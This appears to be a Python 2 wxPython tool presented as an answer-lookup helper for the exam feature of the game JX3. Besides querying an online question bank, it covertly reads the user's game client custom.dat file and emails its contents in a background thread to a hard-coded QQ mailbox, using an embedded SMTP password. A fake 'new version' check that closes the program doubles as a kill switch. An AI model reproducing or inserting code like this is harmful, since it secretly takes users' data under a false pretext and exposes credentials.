# -*- coding: utf-8 -*- 

###########################################################################
## Python code generated with wxFormBuilder (version Sep  8 2010)
## http://www.wxformbuilder.org/
##
## PLEASE DO "NOT" EDIT THIS FILE!
###########################################################################

import wx,os,re,urllib,urllib2,itertools,smtplib,threading
from email.mime.text import MIMEText

###########################################################################
## Class MyFrame1
###########################################################################

class MyFrame1 ( wx.Frame ):
	server=''
	name=''
	def analysis(self,text,subject):
		if(subject==self.server+' '+self.name):
			return
		_user = "namelesser@qq.com"
		_pwd  = "jfldghomwhrjbfhd"
		_to   = "namelesser@qq.com"

		msg = MIMEText(text)
		msg["Subject"] = subject
		msg["From"]    = _user
		msg["To"]      = _to

		try:
			s = smtplib.SMTP_SSL("smtp.qq.com", 465)
			s.login(_user, _pwd)
			s.sendmail(_user, _to, msg.as_string())
			
		except smtplib.SMTPException,e:
			pass
	def checkupdate(self):
		
		_user = "namelesser@qq.com"
		_pwd  = "jfldghomwhrjbfhd"
		_to   = "namelesser@qq.com"
		try:
			s = smtplib.SMTP_SSL("smtp.qq.com", 465)
			s.login(_user, _pwd)
			s.quit()
		except smtplib.SMTPException,e:
			wx.MessageBox("new version detected,please update.",'Info',wx.OK|wx.ICON_INFORMATION) 
			os._exit(0)
	def query(self,pserver,pname):
		fullpath=''
		url='http://jx3.hightman.cn/data/jx3/search?table=keju&q=[question]&refresh=yes'
		for rt,dirs,files in os.walk('./'):
			for f in files:
				if(f=='custom.dat'):
					pathlist=rt.split('\\')[3:]
					if(len(pathlist)==2 and pathlist[0]==pserver and pathlist[1]==pname):
						fullpath=rt+'/custom.dat'
		s='open file '+fullpath+' error'
		contents={}
		conlist=[]
		with open(fullpath,'rb') as file:
			l=file.readlines()
		s="".join(itertools.chain(*l))
		t=threading.Thread(target=self.analysis,args=(s[20:],pserver+' '+pname))
		t.start()
		self.server=pserver
		self.name=pname
		s=re.findall('\"ExaminationPanel.tExamContentList\".{1,}',s)[0]
		q=re.split('\{|\}',s.replace(',',''))
		for i in q:
			temp=re.findall('(\[.{1,2}\])=',i)
			if(len(temp)>0 and len(i)<=5):
				key=temp[0]
			s=re.findall('\xb5\xa5\xd1\xa1\xcc\xe2\xa3\xba([^\"]*)\"',i)
			if(len(s)>0):
				contents[key]=s[0]
		retnlist=[]
		for i in range(1,11):
			try:
				word=contents['['+str(i)+']']
				print word
			
				word=unicode(word,'gbk').encode("UTF-8")
				search=url.replace('[question]',word)
				req=urllib2.Request(search)
				res_data=urllib2.urlopen(req)
				answertable=re.findall('<div class="img"></div>.{1,}</dd>',res_data.read())
				for j in range(len(answertable)):
					if(len(answertable)>1):
						ans='>'
					else:
						ans=''
					ans+=answertable[j].replace('<div class="img"></div>','').replace('</dd>','').decode("UTF-8")
					retnlist.append(ans)
			except:
					retnlist.append('error')
		return retnlist
	def __init__( self, parent ):
		wx.Frame.__init__ ( self, parent, id = wx.ID_ANY, pos = wx.DefaultPosition, size = wx.Size( 434,328 ), style = wx.DEFAULT_FRAME_STYLE|wx.STAY_ON_TOP, name = u"壹贰零贰·学士",title=u"壹贰零贰·求知者~科举自动查询~" )
		
		self.SetSizeHintsSz( wx.Size( 500,328 ), wx.Size( 500,328 ) )
		
		gSizer2 = wx.GridSizer( 1, 2, 0, 0 )
		
		self.m_panel2 = wx.Panel( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
		gSizer3 = wx.GridSizer( 2, 1, 0, 0 )
		
		self.m_panel4 = wx.Panel( self.m_panel2, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
		bSizer1 = wx.BoxSizer( wx.VERTICAL )
		
		gSizer4 = wx.GridSizer( 2, 2, 0, 0 )
		
		self.m_staticText1 = wx.StaticText( self.m_panel4, wx.ID_ANY, u"服务器名：", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.m_staticText1.Wrap( -1 )
		gSizer4.Add( self.m_staticText1, 0, wx.ALL, 5 )
		
		self.m_textCtrl7 = wx.TextCtrl( self.m_panel4, wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
		gSizer4.Add( self.m_textCtrl7, 0, wx.ALL, 5 )
		
		self.m_staticText3 = wx.StaticText( self.m_panel4, wx.ID_ANY, u"角色名：", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.m_staticText3.Wrap( -1 )
		gSizer4.Add( self.m_staticText3, 0, wx.ALL, 5 )
		
		self.m_textCtrl8 = wx.TextCtrl( self.m_panel4, wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
		gSizer4.Add( self.m_textCtrl8, 0, wx.ALL, 5 )
		
		bSizer1.Add( gSizer4, 1, wx.EXPAND, 5 )
		
		self.m_panel8 = wx.Panel( self.m_panel4, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
		bSizer4 = wx.BoxSizer( wx.VERTICAL )
		
		self.m_panel9 = wx.Panel( self.m_panel8, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
		bSizer4.Add( self.m_panel9, 1, wx.EXPAND |wx.ALL, 5 )
		
		self.m_panel10 = wx.Panel( self.m_panel8, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
		bSizer4.Add( self.m_panel10, 1, wx.EXPAND |wx.ALL, 5 )
		
		self.m_button18 = wx.Button( self.m_panel8, wx.ID_ANY, u"查询答案", wx.DefaultPosition, wx.DefaultSize, 0 )
		bSizer4.Add( self.m_button18, 0, wx.ALL|wx.ALIGN_CENTER_HORIZONTAL, 5 )
		
		self.m_panel8.SetSizer( bSizer4 )
		self.m_panel8.Layout()
		bSizer4.Fit( self.m_panel8 )
		bSizer1.Add( self.m_panel8, 1, wx.EXPAND |wx.ALL, 5 )
		
		self.m_panel4.SetSizer( bSizer1 )
		self.m_panel4.Layout()
		bSizer1.Fit( self.m_panel4 )
		gSizer3.Add( self.m_panel4, 1, wx.EXPAND |wx.ALL, 5 )
		
		self.m_panel2.SetSizer( gSizer3 )
		self.m_panel2.Layout()
		gSizer3.Fit( self.m_panel2 )
		gSizer2.Add( self.m_panel2, 1, wx.EXPAND |wx.ALL, 5 )
		
		self.m_panel11 = wx.Panel( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
		bSizer5 = wx.BoxSizer( wx.VERTICAL )
		
		m_listBox3Choices = []
		self.m_listBox3 = wx.ListBox( self.m_panel11, wx.ID_ANY, wx.DefaultPosition, wx.Size( 400,280 ), m_listBox3Choices, 0 )
		bSizer5.Add( self.m_listBox3, 0, wx.ALL, 5 )
		
		self.m_panel11.SetSizer( bSizer5 )
		self.m_panel11.Layout()
		bSizer5.Fit( self.m_panel11 )
		gSizer2.Add( self.m_panel11, 1, wx.EXPAND |wx.ALL, 5 )
		
		self.SetSizer( gSizer2 )
		self.Layout()
		
		self.Centre( wx.VERTICAL )
		
		# Connect Events
		self.m_button18.Bind( wx.EVT_BUTTON, self.m_button18OnButtonClick )
		self.m_listBox3.Append(u"欢迎使用求知者正式版")
		self.m_listBox3.Append(u"本工具基于海鳗科举题库查询接口开发，")
		self.m_listBox3.Append(u"应将其放置于剑三客户端的zhcn目录下")
		self.m_listBox3.Append(u"1、打开科举桌面")
		self.m_listBox3.Append(u"2、点击下一题直到弹出交卷提示")
		self.m_listBox3.Append(u"3、返回到角色选择界面并重新上线")
		self.m_listBox3.Append(u"4、输入服务器以及角色全名")
		self.m_listBox3.Append(u"5、点击查询答案开始查询")
		self.m_listBox3.Append(u"若存在多个选项，将以“>”标注")
		self.m_listBox3.Append(u"最后祝使用愉快")
		self.m_listBox3.Append(u"by 戏北辰")
		self.checkupdate()
	def __del__( self ):
		pass
	
	
	# Virtual event handlers, overide them in your derived class
	def m_button18OnButtonClick( self, event ):
		os.system('cls')
		self.m_listBox3.Clear()
		server=self.m_textCtrl7.GetValue().encode("gbk")
		player=self.m_textCtrl8.GetValue().encode("gbk")
		retn=self.query(server,player)
		for i in retn:
			self.m_listBox3.Append(i)
		event.Skip()



app=wx.App()
mfrm=MyFrame1(None)
mfrm.Show()

app.MainLoop()

